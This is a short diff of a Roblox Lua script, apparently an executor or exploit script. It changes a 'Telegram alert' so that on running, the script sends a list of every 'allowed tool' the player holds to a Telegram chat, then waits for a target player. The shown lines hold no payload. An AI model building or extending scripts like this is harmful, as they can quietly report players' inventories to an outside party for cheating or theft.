@@ -4,7 +4,6 @@ repeat task.wait() until game:IsLoaded()
 local Player = game.Players.LocalPlayer
 repeat task.wait() until Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
 
-task.wait(10)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -181,11 +180,11 @@ end
 -- MAIN EXECUTION
 local char, hrp = waitForCharacter()
 
--- Immediate Telegram alert
-local hasTool, toolName = hasAllowedTool()
-if hasTool then
-    sendTelegramMessage("Script executed. Player has allowed tool: " .. toolName)
+local allowedTools = getAllowedTools()
+if #allowedTools > 0 then
+    sendTelegramMessage("Script executed. Player has allowed tool(s): " .. table.concat(allowedTools, ", "))
 end
+
 
 -- Wait for target player
 repeat
@@ -212,7 +211,6 @@ while true do
     end
     task.wait(0.1)
 end
-
 
 
 
